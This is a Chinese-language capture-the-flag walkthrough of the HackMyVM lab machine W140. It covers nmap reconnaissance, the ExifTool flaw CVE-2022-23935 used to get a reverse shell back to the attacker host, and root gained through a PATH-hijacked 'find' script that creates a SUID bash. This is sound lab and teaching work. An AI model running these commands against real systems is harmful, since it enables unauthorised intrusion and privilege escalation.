# 0.简介

靶机：https://hackmyvm.eu/machines/machine.php?vm=W140
 难度：绿色
 目标 IP：192.168.205.131
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST
Nmap scan report for 192.168.205.131
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: w140
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.205.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST
Nmap scan report for 192.168.205.131
Host is up (0.00029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)
|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)
|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: w140
MAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.205.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

# 2.踩点

![image-20250331185843031](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185843370.png)

有个上传页/service.html，上传个马看看。不行，我们上传正常的图片

![image-20250331185853481](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185853810.png)

![image-20250331185859700](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185859788.png)

搜索一下有没有利用漏洞

```
┌──(kali㉿kali)-[~/test]
└─$ searchsploit ExifTool 12.37       
Exploits: No Results
Shellcodes: No Results
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit ExifTool 12.3 
Exploits: No Results
Shellcodes: No Results
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit ExifTool 12  
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                                           | linux/local/50911.py
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                         
```

版本不一样，我们继续搜索

https://github.com/cowsecurity/CVE-2022-23935找到一个版本一样的，我们尝试利用

```
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/0xFTW/CVE-2022-23935
正克隆到 'CVE-2022-23935'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)
接收对象中: 100% (7/7), 完成.
处理 delta 中: 100% (1/1), 完成.
                     
┌──(kali㉿kali)-[~/test]
└─$ cd CVE-2022-23935 
                                                                                                                                    
┌──(kali㉿kali)-[~/test/CVE-2022-23935]
└─$chmod +x CVE-2022-23935.py

┌──(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ python3 -m venv env
                                                                                                                                    
┌──(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ source env/bin/activate
                                                                                                                                    
┌──(env)─(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ pip3 install pwntools
Collecting pwntools
  Using cached pwntools-4.14.0-py2.py3-none-any.whl.metadata (5.3 kB)
Collecting paramiko>=1.15.2 (from pwntools)
  Downloading paramiko-3.5.1-py3-none-any.whl.metadata (4.6 kB)
Collecting mako>=1.0.0 (from pwntools)
  Downloading Mako-1.3.9-py3-none-any.whl.metadata (2.9 kB)
Collecting pyelftools>=0.29 (from pwntools)
  Using cached pyelftools-0.31-py3-none-any.whl.metadata (381 bytes)
Collecting capstone>=3.0.5rc2 (from pwntools)
  Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.8 kB)
Collecting ropgadget>=5.3 (from pwntools)
  Using cached ROPGadget-7.6-py3-none-any.whl.metadata (1.0 kB)
Collecting pyserial>=2.7 (from pwntools)
  Using cached pyserial-3.5-py2.py3-none-any.whl.metadata (1.6 kB)
Collecting requests>=2.0 (from pwntools)
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Requirement already satisfied: pip>=6.0.8 in ./env/lib/python3.12/site-packages (from pwntools) (25.0)
Collecting pygments>=2.0 (from pwntools)
  Using cached pygments-2.19.1-py3-none-any.whl.metadata (2.5 kB)
Collecting pysocks (from pwntools)
  Using cached PySocks-1.7.1-py3-none-any.whl.metadata (13 kB)
Collecting python-dateutil (from pwntools)
  Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl.metadata (8.4 kB)
Collecting packaging (from pwntools)
  Using cached packaging-24.2-py3-none-any.whl.metadata (3.2 kB)
Collecting psutil>=3.3.0 (from pwntools)
  Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (22 kB)
Collecting intervaltree>=3.0 (from pwntools)
  Using cached intervaltree-3.1.0-py2.py3-none-any.whl
Collecting sortedcontainers (from pwntools)
  Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl.metadata (10 kB)
Collecting unicorn>=2.0.1 (from pwntools)
  Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.3 kB)
Collecting six>=1.12.0 (from pwntools)
  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting rpyc (from pwntools)
  Using cached rpyc-6.0.1-py3-none-any.whl.metadata (3.5 kB)
Collecting colored_traceback (from pwntools)
  Using cached colored_traceback-0.4.2-py3-none-any.whl.metadata (4.6 kB)
Collecting unix-ar (from pwntools)
  Using cached unix_ar-0.2.1-py2.py3-none-any.whl.metadata (1.9 kB)
Collecting zstandard (from pwntools)
  Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.0 kB)
Collecting MarkupSafe>=0.9.2 (from mako>=1.0.0->pwntools)
  Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting bcrypt>=3.2 (from paramiko>=1.15.2->pwntools)
  Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (9.8 kB)
Collecting cryptography>=3.3 (from paramiko>=1.15.2->pwntools)
  Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.7 kB)
Collecting pynacl>=1.5 (from paramiko>=1.15.2->pwntools)
  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)
Collecting charset-normalizer<4,>=2 (from requests>=2.0->pwntools)
  Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna<4,>=2.5 (from requests>=2.0->pwntools)
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests>=2.0->pwntools)
  Using cached urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests>=2.0->pwntools)
  Using cached certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)
Collecting plumbum (from rpyc->pwntools)
  Using cached plumbum-1.9.0-py3-none-any.whl.metadata (10 kB)
Collecting cffi>=1.12 (from cryptography>=3.3->paramiko>=1.15.2->pwntools)
  Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)
Collecting pycparser (from cffi>=1.12->cryptography>=3.3->paramiko>=1.15.2->pwntools)
  Using cached pycparser-2.22-py3-none-any.whl.metadata (943 bytes)
Using cached pwntools-4.14.0-py2.py3-none-any.whl (12.9 MB)
Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Downloading Mako-1.3.9-py3-none-any.whl (78 kB)
Downloading paramiko-3.5.1-py3-none-any.whl (227 kB)
Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (287 kB)
Using cached pyelftools-0.31-py3-none-any.whl (180 kB)
Using cached pygments-2.19.1-py3-none-any.whl (1.2 MB)
Using cached pyserial-3.5-py2.py3-none-any.whl (90 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Using cached ROPGadget-7.6-py3-none-any.whl (32 kB)
Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)
Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.2 MB)
Using cached colored_traceback-0.4.2-py3-none-any.whl (5.5 kB)
Using cached packaging-24.2-py3-none-any.whl (65 kB)
Using cached PySocks-1.7.1-py3-none-any.whl (16 kB)
Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl (229 kB)
Using cached rpyc-6.0.1-py3-none-any.whl (74 kB)
Using cached unix_ar-0.2.1-py2.py3-none-any.whl (6.5 kB)
Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (5.4 MB)
Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl (278 kB)
Using cached certifi-2025.1.31-py3-none-any.whl (166 kB)
Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (145 kB)
Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl (4.2 MB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl (856 kB)
Using cached urllib3-2.3.0-py3-none-any.whl (128 kB)
Using cached plumbum-1.9.0-py3-none-any.whl (127 kB)
Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (479 kB)
Using cached pycparser-2.22-py3-none-any.whl (117 kB)
Installing collected packages: unicorn, sortedcontainers, pyserial, pyelftools, zstandard, urllib3, unix-ar, six, pysocks, pygments, pycparser, psutil, plumbum, packaging, MarkupSafe, intervaltree, idna, charset-normalizer, certifi, capstone, bcrypt, rpyc, ropgadget, requests, python-dateutil, mako, colored_traceback, cffi, pynacl, cryptography, paramiko, pwntools
Successfully installed MarkupSafe-3.0.2 bcrypt-4.2.1 capstone-6.0.0a3 certifi-2025.1.31 cffi-1.17.1 charset-normalizer-3.4.1 colored_traceback-0.4.2 cryptography-44.0.0 idna-3.10 intervaltree-3.1.0 mako-1.3.9 packaging-24.2 paramiko-3.5.1 plumbum-1.9.0 psutil-6.1.1 pwntools-4.14.0 pycparser-2.22 pyelftools-0.31 pygments-2.19.1 pynacl-1.5.0 pyserial-3.5 pysocks-1.7.1 python-dateutil-2.9.0.post0 requests-2.32.3 ropgadget-7.6 rpyc-6.0.1 six-1.17.0 sortedcontainers-2.4.0 unicorn-2.1.1 unix-ar-0.2.1 urllib3-2.3.0 zstandard-0.23.0
                                                                                                                                    
┌──(env)─(kali㉿kali)-[~/test/CVE-2022-23935]
└─$ python3 CVE-2022-23935.py 192.168.205.128 8888
/home/kali/test/CVE-2022-23935/CVE-2022-23935.py:14: SyntaxWarning: invalid escape sequence '\ '
  print("""
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or /home/kali/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.0)
[+] Connected!!!!

   _____ __      __ ______      ___    ___  ___   ___        ___   ____    ___  ____   _____ 
  / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \  / _ \|___ \ | ____|
 | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || (_) | __) || |__  
 | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ <  \__, ||__ < |___ \ 
 | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) |   / / ___) | ___) |
  \_____|    \/    |______|    |____| \___/|____||____|     |____||____/   /_/ |____/ |____/       

                                            by 0xFTW                                                                              
      
[+] Trying to bind to :: on port 8888: Done
[+] Waiting for connections on :::8888: Got connection from ::ffff:192.168.205.131 on port 37880
[*] Switching to interactive mode
bash: cannot set terminal process group (376): Inappropriate ioctl for device
bash: no job control in this shell
www-data@w140:/var/www/uploads/1738979826$ $ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![image-20250331185917326](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185917403.png)

# 3.提权

```
www-data@w140:/var/www/uploads/1738979826$ $ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
www-data@w140:/var/www/uploads/1738979826$ $ cd ..
cd ..
www-data@w140:/var/www/uploads$ $ ls -la
ls -la
total 16
drwx------ 4 www-data root     4096 Feb  7 20:57 .
drwxr-xr-x 4 root     root     4096 Feb 21  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Feb  7 20:51 1738979493
drwxr-xr-x 2 www-data www-data 4096 Feb  7 20:57 1738979826
www-data@w140:/var/www/uploads$ $ cd ..
cd ..
www-data@w140:/var/www$ $ ls -al
ls -al
total 48
drwxr-xr-x  4 root     root  4096 Feb 21  2023 .
drwxr-xr-x 12 root     root  4096 Jan 29  2023 ..
-rw-r--r--  1 root     root 28744 Feb 21  2023 .w140.png
drwxr-xr-x  7 root     root  4096 Feb 14  2023 html
drwx------  4 www-data root  4096 Feb  7 20:57 uploads
```

有个图片传过来看看

![image-20250331185924540](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185924622.png)

qr，我们识别一下

![image-20250331185931745](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185931796.png)

登录

```
www-data@w140:/var/www$ $ cd /home/
cd /home/
www-data@w140:/home$ $ ls
ls
ghost
www-data@w140:/home$ $ su - ghost
su - ghost
Password: $ BaoeCblP5KGJDmA
$ id
uid=1000(ghost) gid=1000(ghost) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
```

看到SETENV，我就知道是环境变量劫持了

```
$ cd /opt/
$ ls -la
total 20
drwxr-xr-x  3 root root 4096 Feb 18  2023 .
drwxr-xr-x 18 root root 4096 Jan 29  2023 ..
-rw-------  1 root root    5 Feb 18  2023 .bashre
-rwxr-xr-x  1 root root  423 Feb 17  2023 Benz-w140
drwxr-xr-x  8 root root 4096 Dec  8  2021 exiftool
$ cat /opt/Benz-w140
                                                                                                             
#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140    

# clean up log files
if [ -s log/w140.log ] && ! [ -L log/w140.log ]
then
/bin/cat log/w140.log > log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

find没有绝对地址，所以

```
$ cd /tmp/
$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' > find
$ chmod +x find
$ ls -la
total 836
drwxrwxrwt  2 root     root       4096 Feb  7 21:11 .
drwxr-xr-x 18 root     root       4096 Jan 29  2023 ..
-rwxr-xr-x  1 ghost    ghost        39 Feb  7 21:11 find
-rwxr-xr-x  1 www-data www-data 839766 Jan 29 04:04 linpeas.sh
$ cat find
cp /bin/bash /tmp/sh;chmod u+s /tmp/sh
$ sudo PATH=$PWD:$PATH /opt/Benz-w140
/opt/Benz-w140: 4: cd: can't cd to /home/ghost/w140
$ ls -la
total 2044
drwxrwxrwt  2 root     root        4096 Feb  7 21:13 .
drwxr-xr-x 18 root     root        4096 Jan 29  2023 ..
-rwxr-xr-x  1 ghost    ghost         39 Feb  7 21:11 find
-rwxr-xr-x  1 www-data www-data  839766 Jan 29 04:04 linpeas.sh
-rwsr-xr-x  1 root     root     1234376 Feb  7 21:13 sh
$ /tmp/sh -p
$ id
uid=1000(ghost) gid=1000(ghost) euid=0(root) groups=1000(ghost),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```



<!-- ##{"timestamp":1739012133}## -->